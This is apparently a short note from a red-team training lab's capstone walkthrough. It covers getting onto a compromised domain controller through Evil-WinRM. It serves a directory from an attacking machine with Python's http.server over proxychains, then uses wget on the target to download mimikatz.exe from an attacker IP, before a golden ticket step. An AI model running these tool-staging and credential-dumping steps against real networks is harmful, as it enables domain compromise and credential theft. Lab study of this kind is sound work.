
[[Dumping secrets from CORPDC#Connect to RDP with the Administrator's credentials|Connect to CORP.DC with Administration credentials]]

NOTE: If you can't connect , go to [[Dumping secrets from CORPDC]]

### Enable http.server using python and proxychains on the Attacking machine


~/…/red_team_recon/Capstone_Challenge/Capstone_Challenge_Resources/Tools/mimikatz_trunk/x64$  `proxychains4 -q python3 -m http.server`

### Get mimikatz
On the tools provided on Capstone challenge folder you can find mimikatz.
Run on the Evil-WinRM shell the following command.

Evil-WinRM* PS C:\Users\Administrator> `wget http://10.50.110.16:8000/mimikatz.exe -o mimikatz.exe`

**Next step:** [[Golden Ticket Attack with mimikatz]]
